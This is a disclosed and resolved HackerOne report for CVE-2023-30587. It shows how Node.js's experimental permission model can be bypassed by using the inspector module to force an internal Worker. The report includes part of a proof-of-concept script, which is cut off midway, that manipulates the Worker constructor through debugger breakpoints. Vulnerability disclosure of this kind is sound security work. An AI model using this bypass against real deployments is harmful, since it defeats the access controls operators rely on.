# [H] Process-based permissions can be bypassed with the "inspector" module.  

## Summary
Severity: High (CVSS 7.7)
Program: Node.js
Weakness: Improper Access Control - Generic
Reporter: mattaustin
State: resolved
Disclosed: 2023-07-20T20:58:32.838Z
CVE: CVE-2023-30587
Source: https://hackerone.com/reports/1962701

## Details
**Summary:**

Restrictions made with with the --experimental-permission flag can by bypassed with the built-in inspector module. 

**Description:** 

The Worker class  can take an argument (the kIsInternal Symbol) to create an "internal worker" which does not respect the process level restrictions. 

We cant access this Symbol('kIsInternal'); directly, however the [inspector module](https://nodejs.org/api/inspector.html) is not disabled when process level restrictions are in place.  "The node:inspector module provides an API for interacting with the V8 inspector."

If we attach inspector inside the Worker constructor before `new WorkerImpl` is created we can simply change the value of "isInternal". 

## Steps To Reproduce:

1. Create the following `bypass.js` file: 

```javascript
const { Session } = require('node:inspector/promises');

const session = new Session();
session.connect();

(async ()=>{
	await session.post('Debugger.enable');
	await session.post('Runtime.enable');

	global.Worker = require('node:worker_threads').Worker;
	
	let {result:{ objectId }} = await session.post('Runtime.evaluate', { expression: 'Worker' });
	let { internalProperties } = await session.post("Runtime.getProperties", { objectId: objectId });
	let {value:{value:{ scriptId }}} = internalProperties.filter(prop => prop.name == '[[FunctionLocation]]')[0];
	let { scriptSource } = await session.post("Debugger.getScriptSource", { scriptId });

	// find the line number where WorkerImpl is called. 
	const lineNumber = scriptSource.substring(0, scriptSource.indexOf("new WorkerImpl")).split('\n').length;

	// WorkerImpl will bypass permission for internal modules. We can inject the local var "isInternal = true" with a conditional breakpoint.
	await session.post("Debugger.setBreakpointByUrl", {
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/1962701_
